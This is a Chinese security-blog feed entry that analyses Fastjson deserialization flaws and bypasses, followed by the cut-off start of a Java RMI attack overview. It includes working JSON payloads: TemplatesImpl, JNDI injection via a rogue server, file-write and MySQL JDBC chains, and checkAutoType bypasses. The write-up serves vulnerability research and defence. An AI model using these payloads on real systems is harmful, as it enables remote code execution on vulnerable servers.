    <content type="html"><![CDATA[<blockquote><p>Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. Fastjson can work with arbitrary Java objects including pre-existing objects that you do not have source-code of.</p></blockquote><p>可以由<code>JSON.toJSONString(object)</code>将对象序列化为json字符串，由<code>JSON.parseObject/parseArray</code>或<code>JSON.parse</code>从json字符串中反序列化还原为对象。在序列化时指定开启<code>SerializerFeature.WriteClassName</code>功能，会在生成的json字段中加入<code>@type</code>用于指定具体类名，这样可以避免继承类被误反序列化为父类，从而丢失子类特有属性。</p><h2 id="1-2-24一般流程简述"><a href="#1-2-24一般流程简述" class="headerlink" title="1.2.24一般流程简述"></a>1.2.24一般流程简述</h2><p>根据方法与传参的不同，入口可能对应多个重载方法，但总体上与漏洞相关的逻辑大同小异：</p><ol><li><p>解析器初始化，调用解析方法</p></li><li><p>加载<code>@type</code>指定的类对象和与之对应的<code>Deserializer</code></p></li><li><p>如果类名在<code>denyList</code>中就抛出异常（黑名单）</p></li><li><p>如果是<code>JavaBeanDeserializer</code>，会通过内省获取方法和属性</p></li><li><p>获取到<code>defaultConstructor</code>则会进入第六步</p></li><li><p>将满足条件的setter与getter及相关属性，封装为<code>FieldInfo</code>类并加入<code>fieldList</code></p></li></ol><p><img src="/img/fastjsonsum_a.png"></p><p><img src="/img/fastjsonsum_b.png"></p><ol start="7"><li><p>将<code>Deserializer</code>缓存进<code>IdentityHashMap</code></p></li><li><p>获取各个属性对应的<code>FieldValueDeserilizer</code>，反序列化属性对象</p></li><li><p>由<code>setValue</code>根据属性类型，按照不同方式还原类对象属性</p></li></ol><p><img src="/img/fastjsonsum_c.png"></p><h3 id="调用getter"><a href="#调用getter" class="headerlink" title="调用getter"></a>调用getter</h3><p>第六步getter对于返回值类型要求比较严格，可以利用Fastjson一些特性扩大范围。</p><p>对于<code>JSON.parseObject(String text)</code>会先调用<code>parse</code>解析，如果返回类型不是<code>JSONObject</code>就通过<code>toJSON</code>转换:</p><p><img src="/img/fastjsonsum_i.png"></p><p>满足判断时可由<code>JSONSerializer.getObjectWriter</code>-&gt;<code>TypeUtils.buildBeanInfo</code>-&gt;<code>computeGetters</code>获取getter且无返回值类型限制。因为<code>JSONObject.toString</code>被重写成了<code>toJSONString</code>，只需构造形如<code>&#123;&#123;Gadgets&#125;:&quot;str&quot;&#125;</code>的结构即可触发。</p><p>此外对于JSON中<code>$ref</code>的值，会在<code>parse</code>完成后作为JSONPath解析，传入<code>$.valuea.valueb</code>可以链式触发<code>getValuea</code>和<code>getValueb</code>，这样就能调用到指定getter。</p><h3 id="指定还原类"><a href="#指定还原类" class="headerlink" title="指定还原类"></a>指定还原类</h3><p>当<code>parseObject</code>方法指定的还原类与JSON中<code>@type</code>指定的还原类不一致时，根据@香依香偎师傅的实验结果来看，如果两个类存在继承关系或是能由<code>toString</code>等方法转换，则通常可以正常反序列化并触发Payload；否则要具体情况具体分析。</p><h2 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;BASE64&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;any&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,</span><br><span class="line">  <span class="attr">&quot;_outputProperties&quot;</span>:&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>outputProperties</code>属性在<code>setValue</code>时，会调用<code>TemplatesImpl#getOutputProperties</code>，进而调用到<code>TransletClassLoader#defineClass</code>触发类加载。</p><p>Payload几个关键属性都是<code>private</code>且无相应setter/getter，因此反序列化时需要指定1.2.22版本引入的<code>Feature.SupportNonPublicField</code>：</p><p><img src="/img/fastjsonsum_d.png"></p><h2 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;RogueJNDI&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>autoCommit</code>属性在<code>setValue</code>时，会调用<code>JdbcRowSetImpl#setAutoCommit</code>，进而调用到<code>InitialContext#lookup</code>触发JNDI注入。</p><h2 id="checkAutoType绕过"><a href="#checkAutoType绕过" class="headerlink" title="checkAutoType绕过"></a>checkAutoType绕过</h2><p>从1.2.25开始先进入<code>checkAutoType</code>检查，再调用<code>TypeUtils.loadClass</code>加载类。</p><h3 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h3><p>在手动开启<code>autoTypeSupport</code>时，会将类名与内置黑名单进行前缀匹配。利用<code>TypeUtils.loadClass</code>剔除<code>L</code>前缀和<code>;</code>后缀的特点，在原类名前后添加字符即可绕过内置黑名单的判断。</p><ul><li><code>L ClassName ;</code>、<code>[</code>分别是JVM的类、数组表示符</li></ul><p>1.2.42先剔除一次类名前后的<code>L</code>和<code>;</code>再进行黑名单判断，同时将黑名单从明文改为哈希形式，可以双写字符绕过。</p><p>1.2.43检查两次前缀，拦截<code>LL</code>开头的情况，可以构造<code>[ClassName[&#123;...</code>的数组形式，利用内部逻辑调用到<code>parseArray</code>实现绕过。</p><p>1.2.44增加了对<code>[</code>开头的检查，终结了已有黑名单绕过。如果存在某些依赖可以利用新链突破，后续更新也在继续完善黑名单。</p><h3 id="利用缓存机制"><a href="#利用缓存机制" class="headerlink" title="利用缓存机制"></a>利用缓存机制</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;GadgetsClassname&quot;&#125;:Gadgets</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以1.2.47为例，<code>java.lang.Class</code>对应的deserializer是<code>MiscCodec</code>，反序列化会解析JSON中<code>val</code>对应的值并生成对象，之后通过<code>TypeUtils.loadClass</code>加载<code>java.lang.Class</code>。loadClass方法的<code>cache</code>参数的缺省值为true，会将<code>val</code>值生成的对象存入<code>mappings</code>中。</p><p>下一轮<code>checkAutoType</code>时如果手动开启了<code>autoTypeSupport</code>，恶意类先黑名单匹配还是会被检测到，但只要在<code>mappings</code>缓存中匹配到了就不会抛出异常。之后无论<code>checkAutoType</code>是否开启，都能拿到缓存中的恶意类。</p><p><img src="/img/fastjsonsum_e.png"></p><p>要注意的是虽然1.2.25就加入了缓存机制，但1.2.33之前匹配黑名单就会抛出异常。1.2.48将<code>cache</code>缺省值改为false，新增了<code>Class.forName</code>前的判断，同时追加了黑名单以及对<code>expectClass</code>的检测。</p><h3 id="利用期望类"><a href="#利用期望类" class="headerlink" title="利用期望类"></a>利用期望类</h3><p>期望类可以由类间关系隐式确定，也可以由两个<code>@type</code>显式指定。一个期望类为<code>Foo</code>的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    Foo id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooImpl</span> <span class="keyword">implements</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line">    String fooId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>由类间关系确定</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;User&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;id&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;FooImpl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;fooId&quot;</span>:<span class="string">&quot;abc&quot;</span></span><br><span class="line">    &#125;,   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>由JSON显式指定</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Foo&quot;</span>,<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;FooImpl&quot;</span>,<span class="attr">&quot;fooId&quot;</span>:<span class="string">&quot;abc&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>从玄武实验室梳理的<code>checkAutoType</code>的流程可以看出，期望类及其派生的子类不在黑名单中就能通过检查：</p><p><img src="/img/fastjsonsum_f.png"></p><p><code>expectClass</code>由<code>checkAutoType</code>的二参传入，多数情况下是null，先要找出存在有效参数的调用，一个是<code>ThrowableDeserializer</code>、一个是<code>JavaBeanDeserializer</code></p><p><img src="/img/fastjsonsum_g.png"></p><p>在<code>ParserConfig#getDeserializer</code>可以看到<code>Throwable.class</code>的派生类由<code>ThrowableDeserializer</code>处理、没有专属Deserializer的类由<code>JavaBeanDeserializer</code>处理</p><p><img src="/img/fastjsonsum_h.png"></p><p>哪些类会由<code>JavaBeanDeserializer</code>处理呢？以<code>TypeUtils#addBaseClassMappings</code>的<code>classes</code>作为样本，提取<code>getDeserializer</code>方法稍作改动并筛除<code>expectClassFlag</code>为false的类后得到：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">java.lang.AutoCloseable</span><br><span class="line">java.lang.StackTraceElement</span><br><span class="line">java.util.concurrent.atomic.AtomicInteger</span><br><span class="line">java.util.concurrent.atomic.AtomicLong</span><br><span class="line">java.lang.Boolean</span><br><span class="line">java.lang.Character</span><br><span class="line">java.lang.Byte</span><br><span class="line">java.lang.Short</span><br><span class="line">java.lang.Integer</span><br><span class="line">java.lang.Long</span><br><span class="line">java.lang.Float</span><br><span class="line">java.lang.Double</span><br><span class="line">java.lang.Number</span><br><span class="line">java.lang.String</span><br><span class="line">java.math.BigDecimal</span><br><span class="line">java.math.BigInteger</span><br><span class="line">java.util.BitSet</span><br><span class="line">java.util.Calendar</span><br><span class="line">java.util.Date</span><br><span class="line">java.util.Locale</span><br><span class="line">java.util.UUID</span><br><span class="line">java.sql.Time</span><br><span class="line">java.sql.Date</span><br><span class="line">java.sql.Timestamp</span><br><span class="line">java.text.SimpleDateFormat</span><br><span class="line">com.alibaba.fastjson.JSONPObject</span><br></pre></td></tr></table></figure><ul><li>1.2.68更新的<code>safeMode</code>机制用于完全禁用<code>autoType</code>，手动开启后遇到<code>@type</code>直接抛异常</li></ul><h2 id="寻找Gadgets"><a href="#寻找Gadgets" class="headerlink" title="寻找Gadgets"></a>寻找Gadgets</h2><p>派生类中有可被自动调用的敏感方法，就是一个可选的潜在期望类，最好是一个被广泛使用的接口（<code>AutoCloseable</code>表示你直接报我哈希得了(✪ω✪)）。而魔术方法除了setter、getter、无参构造函数外，还可以调用 能通过<code>ASMUtils.lookupParameterNames</code>获取到参数名 且重载参数最多的构造函数：</p><p><img src="/img/fastjsonsum_k.png"></p><ul><li>参数名存放于<code>LocalVariableTable</code>，只在编译时带调试信息才会有</li></ul><h3 id="OutputStream利用链"><a href="#OutputStream利用链" class="headerlink" title="OutputStream利用链"></a>OutputStream利用链</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;out&quot;</span>:&#123;</span><br><span class="line">        <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.util.zip.InflaterOutputStream&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;out&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;file&quot;</span>:<span class="string">&quot;/tmp/test&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;append&quot;</span>:<span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;infl&quot;</span>:&#123;</span><br><span class="line">            <span class="attr">&quot;input&quot;</span>:&#123;</span><br><span class="line">                <span class="attr">&quot;array&quot;</span>:<span class="string">&quot;eNorSS0uMTQyBgAKygJX&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;limit&quot;</span>:<span class="number">15</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">&quot;bufLen&quot;</span>:<span class="string">&quot;100&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;protocolVersion&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>通过<code>FileOutputStream(File file, boolean append)</code>创建文件并作为<code>InflaterOutputStream(OutputStream out, Inflater infl, int bufLen)</code>的一参</p></li><li><p>二参<code>Inflater</code>类中存在<code>ByteBuffer input</code>属性，经过<code>JSONScanner#bytesValue</code>Base64解码得到byte后，会在<code>ByteBufferCodec$ByteBufferBean#byteBuffer</code>完成组装（其中<code>array</code>是zip压缩后byte的Base64编码，<code>limit</code>是字节长度）</p></li><li><p>最终由<code>MarshalOutputStream</code>的父类构造函数<code>ObjectOutputStream</code>-&gt;<code>this.bout.setBlockDataMode</code>-&gt;<code>this.drain</code>-&gt;<code>this.out.write</code>触发写入</p></li></ol><p>要注意的是1.2.57才开始支持ByteBuffer反序列化，有调试信息的部分JDK8版本与这个OpenJDK11<code>input</code>属性有不同。</p><h3 id="MysqlJDBC利用链"><a href="#MysqlJDBC利用链" class="headerlink" title="MysqlJDBC利用链"></a>MysqlJDBC利用链</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;hostToConnectTo&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;portToConnectTo&quot;</span>: <span class="number">3306</span>,</span><br><span class="line">  <span class="attr">&quot;info&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;user&quot;</span>: <span class="string">&quot;root&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;statementInterceptors&quot;</span>: <span class="string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;autoDeserialize&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;NUM_HOSTS&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;databaseToConnectTo&quot;</span>: <span class="string">&quot;dbname&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JDBC4Connection类构造函数初始化时会使用父类ConnectionImpl的构造函数，进一步通过<code>ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</code>-&gt;<code>Util.resultSetToMap</code>-&gt;<code>rs.getObject</code>触发MysqlJDBC反序列化。</p><h3 id="双亲委派类加载"><a href="#双亲委派类加载" class="headerlink" title="双亲委派类加载"></a>双亲委派类加载</h3><p>通过<code>System.getProperty</code>可以获取<code>sun.boot.class.path</code>、<code>java.ext.dirs</code>的值，根据双亲委派的特点如果能将恶意类上传/写入<code>jre/classes</code>（这个目录似乎默认不存在，需要新建），或者覆盖已有的jar包（比如<code>charsets.jar</code>），就可以由Fastjson触发恶意类加载。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实现AutoCloseable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Run&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承Exception</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;Run&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype">enable_autotype</a></p><p><a href="https://github.com/alibaba/fastjson/wiki/JSONPath">JSONPath</a></p><p><a href="https://github.com/alibaba/fastjson/wiki/fastjson_safemode">fastjson_safemode</a></p><p><a href="https://mp.weixin.qq.com/s/0a5krhX-V_yCkz-zDN5kGg">fastjson 反序列化漏洞 POC 分析</a></p><p><a href="https://www.freebuf.com/vuls/208339.html">浅谈Fastjson RCE漏洞的绕过史</a></p><p><a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6">fastjson一种利用$ref几乎任意getter触发的方法</a></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">fastjson blacklist</a></p><p><a href="https://rmb122.com/2020/06/12/fastjson-1-2-68-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-gadgets-%E6%8C%96%E6%8E%98%E7%AC%94%E8%AE%B0/">fastjson 1.2.68 反序列化漏洞 gadgets 挖掘笔记</a></p><p><a href="https://github.com/alibaba/fastjson/issues/2357">fastjson序列化ByteBuffer的问题</a></p><p><a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">Fastjson 1.2.68 反序列化漏洞 Commons IO 2.x 写文件利用链挖掘分析</a></p><p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">US-21-Xing-How-I-Used-a-JSON</a></p><p><a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack</a></p><p><a href="https://landgrey.me/blog/22/">Spring Boot Fat Jar 写文件漏洞到稳定 RCE 的探索</a></p><p><a href="https://articles.zsxq.com/id_56fvo4dtbivd.html">JDK8任意文件写场景下的Fastjson RCE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to c</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Fastjson" scheme="https://hosch3n.github.io/tags/Fastjson/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="Xalan" scheme="https://hosch3n.github.io/tags/Xalan/"/>
    
    <category term="JNDI" scheme="https://hosch3n.github.io/tags/JNDI/"/>
    
    <category term="JDBC" scheme="https://hosch3n.github.io/tags/JDBC/"/>
    
  </entry>
  
  <entry>
    <title>攻击JavaRMI概述</title>
    <link href="https://hosch3n.github.io/2022/02/15/%E6%94%BB%E5%87%BBJavaRMI%E6%A6%82%E8%BF%B0/"/>
    <id>https://hosch3n.github.io/2022/02/15/%E6%94%BB%E5%87%BBJavaRMI%E6%A6%82%E8%BF%B0/</id>
    <published>2022-02-15T07:14:53.000Z</published>
    <updated>2022-05-11T07:52:48.980Z</updated>
    
    <content type="html"><![CDATA[<p>可能师傅们也遇到过这种情况：因为问题A跟进某个类方法，调试期间遇到一个更纠结的问题B，在费尽周折终于搞清楚后，暮然回首却忘了自己在干什么（问题A）。。。QAQ</p><p>JavaRMI与相关攻击面错综复杂，因此本文仅以时间线梳理各种绕过方法与缓解措施的主要逻辑，而不会详述具体调用栈（但会指出关键类方法）。大家可以自行跟进加深印象，也可以参考其它师傅的文章云调试。</p><hr><p>RMI全称是<code>Remote Method Invocation</code>（远程方法调用），可以理解为远程过程调用（RPC）的Java实现版本。它使得应用程序员可以像调用本地方法一样（<code>stub.func(arg)</code>），调用远程主机上提供的方法，方法实际最终在远程主机上执行（<code>serv.func(arg)</code>），原因是本地类封装了与远程类基于<strong>序列化</strong>的网络通信（<code>socket</code>）</p><p>我们将上述提供业务方法的远程主机称为服务端，将发起方法调用的本地主机称为客户端。服务端会监听在一个随机端口上，将自己的通信地址等信息封装后（<code>stub</code>）由某种途径交给客户端。这种途径就是默认监听在1099端口上的注册端。</p><p><img src="/img/rmisum_a.png" alt="https://github.com/jasonGeng88/blog/blob/master/201704/assets/rmi_01.png"></p><h2 id="攻击业务危险方法"><a href="#攻击业务危险方法" class="headerlink" title="攻击业务危险方法"></a>攻击业务危险方法</h2><p>如果远程方法实现中存在输入流可控的危险方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">clazz &#123;</span><br><span class="line">    func(arg) &#123;</span><br><span class="line">        exec(arg)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理论上就跟利用Web应用漏洞一样，RMI此时就是一个毫无存在感的中间层。实际情况是基本没有能直接调用到的危险方法，而且也不知道危险方法的调用接口（<code>clazz.func(arg)</code>）</p><blockquote><p><code>java.rmi.server.useCodebaseOnly</code>在7u21|6u45时由默认false改为true，下文均需要被攻击端存在gadgets。另外为了行文流畅，8u241对String类型反序列化作的变动放在文末统一说明。</p></blockquote><h2 id="攻击远程方法参数"><a href="#攻击远程方法参数" class="headerlink" title="攻击远程方法参数"></a>攻击远程方法参数</h2><p>当服务端并不存在危险业务方法，但我们可以拿到远程方法接口类（比如开源应用）。发现它接收一个Object类型参数（<code>func(Object arg, ...)</code>），在此处传入恶意payload对象，服务端从网络接收数据并试图反序列化还原对象时，就会触发gadgets。</p><p>相比Object类型，远程方法入参更有可能是int、boolean等基本数据类型，或是String以及其它封装类。客户端会根据方法名及参数类型生成哈希，服务端收到这个哈希就能知道调用的是哪一个方法（<code>sun.rmi.server.UnicastServerRef#hashToMethod_Map</code>）</p><p>那么把恶意对象强行塞给非Object参数能否触发反序列化执行呢？当远程方法参数为非基本数据类型时，<code>sun.rmi.server.UnicastRef#unmarshalValue</code>就会进入readObject所在分支。通过 修改网络数据、修改字节码、修改内存对象、修改RMI客户端实现 任意一种方法，将方法哈希修改为服务端存在且符合类型要求的远程方法哈希，即可触发强行塞入的恶意对象。</p><p><img src="/img/rmisum_b.png"></p><h2 id="攻击RMI注册端"><a href="#攻击RMI注册端" class="headerlink" title="攻击RMI注册端"></a>攻击RMI注册端</h2><p>抛开具体业务远程方法，Registry也提供了基本方法：</p><ul><li>bind(String, Remote)</li><li>list()</li><li>lookup(String)</li><li>rebind(String, Remote)</li><li>unbind(String)</li></ul><p>除了list方法不会向<strong>注册端</strong>传递参数，其余四个方法的任意参数都会被注册端接收并readObject（<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>），要解决的问题是如何让恶意对象符合类型要求。</p><p><a href="https://github.com/NickstaDB/BaRMIe/blob/master/src/nb/barmie/net/proxy/thread/BindPayloadInjectingProxyThread.java">BaRMIe</a>采用代理注册端，通过<code>handleData</code>方法替换字节流数据，最终形成<code>bind(payload, null)</code></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java#L75">ysoserial.exploit.RMIRegistryExploit</a>采用动态代理，通过<code>createMemoitizedProxy</code>方法封装为Remote，最终形成<code>bind(&quot;pwnedXXX&quot;, payload)</code></p><p>我们也可以自己创建一个类并实现<code>Remote, Serializable</code>，将payload对象赋值放入任意类属性。虽然注册端递归反序列化后最终会找不到自定义类报错，但在此之前会先触发gadgets。</p><p><img src="/img/rmisum_c.png"></p><p>在JEP290（8u121，7u131，6u141）加入的<code>sun.rmi.registry.RegistryImpl#registryFilter</code>会限制递归深度、数组长度，并基于白名单递归检查类型，会拦截payload的最终执行。</p><p><img src="/img/rmisum_d.png"></p><p>此外在8u141将<code>dispatch</code>中原来的先readObject再RegistryImpl.checkAccess（默认仅允许注册端与服务端同地址），修正为了先作检查。会使攻击者伪装成服务端向注册端发起bind/rebind/unbind的攻击失效，但不会影响攻击者作为客户端发起lookup。</p><h2 id="攻击DGC服务"><a href="#攻击DGC服务" class="headerlink" title="攻击DGC服务"></a>攻击DGC服务</h2><p>DGC全称是<code>Distributed Garbage Collection</code>，顾名思义其实就是GC（垃圾回收）的分布式方案。与Registry类似，DGC服务也提供了基本方法<code>dirty()</code>和<code>clean()</code>。客户端需要用到<strong>注册端</strong>或<strong>服务端</strong>的远程对象时，会通过dirty申请。相应的，当客户端不再需要时则会通过clean注销。</p><p>而同样与Registry类似，<strong>注册端</strong>或<strong>服务端</strong>上的<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>，会接收DGC客户端经由dirty或clean传过来的部分数据并readObject，要解决的问题是<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>并没有一个参数接口用于传递对象。</p><p>对此，<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPClient.java#L55">ysoserial.exploit.JRMPClient</a>按照DGC通信的固定格式直接走socket通信在相应位置写入了payload，最终形成<code>[0x4a524d49, 2, 0x4c, 0x50| 2, 0, 0, 0, 1, -669196253586618813L, payload]</code>的数据流。</p><p><img src="/img/rmisum_e.png"></p><p>在JEP290加入的<code>sun.rmi.transport.DGCImpl#checkInput</code>逻辑也与之前相同，会拦截payload的最终执行。</p><h2 id="攻击JRMP客户端"><a href="#攻击JRMP客户端" class="headerlink" 